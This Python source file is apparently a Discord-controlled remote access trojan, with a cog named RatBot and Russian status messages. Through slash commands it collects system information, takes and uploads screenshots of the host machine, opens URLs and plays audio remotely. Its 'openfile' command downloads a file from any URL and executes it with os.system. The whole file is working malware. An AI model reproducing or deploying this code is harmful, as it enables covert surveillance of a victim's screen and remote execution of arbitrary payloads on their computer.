import disnake
from disnake.ext import commands
import cfg
import modules
import os
import requests
import asyncio

bot = commands.InteractionBot()


class RatBot(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot
        self.playsound = None

    @commands.slash_command()
    async def ping(self, inter: disnake.ApplicationCommandInteraction):
        await inter.response.send_message(modules.sysinfo(), ephemeral=True)

    @commands.slash_command()
    async def openurl(self, inter: disnake.ApplicationCommandInteraction, url: str):
        modules.openweb(url)
        await inter.response.send_message("Выполнено", ephemeral=True)

    @commands.slash_command()
    async def screenshot(self, inter: disnake.ApplicationCommandInteraction):
        with open(modules.screenshot(), 'rb') as file:
            picture = disnake.File(file)
        await inter.send(f"Скрин", file=picture)

    @commands.slash_command()
    async def playsound(self, inter: disnake.ApplicationCommandInteraction, url: str):
        file_name = "playsound.mp3"
        folder_path = ".files"
        os.makedirs(folder_path, exist_ok=True)
        file_path = os.path.join(folder_path, file_name)
        response = requests.get(url)
        with open(file_path, 'wb') as file:
            file.write(response.content)
        self.playsound = modules.play_mp3(file_path)
        await inter.response.send_message("Выполнено", ephemeral=True)
        try:
            while self.playsound.music.get_busy():  # wait for music to finish playing
                await asyncio.sleep(1)
            self.playsound.quit()
        except Exception:
            pass
        self.playsound = None

    @commands.slash_command()
    async def stopsound(self, inter: disnake.ApplicationCommandInteraction):
        if self.playsound is not None:
            self.playsound.quit()
            self.playsound = None
            await inter.response.send_message("Выполнено", ephemeral=True)
        else:
            await inter.response.send_message("Ничего не воспроизводится", ephemeral=True)

    @commands.slash_command()
    async def openfile(self, inter: disnake.ApplicationCommandInteraction, url: str, file_type: str):
        file_name = f"file.{file_type}"
        folder_path = ".files"
        os.makedirs(folder_path, exist_ok=True)
        file_path = os.path.join(folder_path, file_name)
        response = requests.get(url)
        with open(file_path, 'wb') as file:
            file.write(response.content)
        os.system(file_path)
        await inter.response.send_message("Выполнено", ephemeral=True)


@bot.event
async def on_ready():
    print("Бот готов!")


def setup(bot: commands.InteractionBot):
    bot.add_cog(RatBot(bot))


setup(bot)
bot.run(cfg.TOKEN)
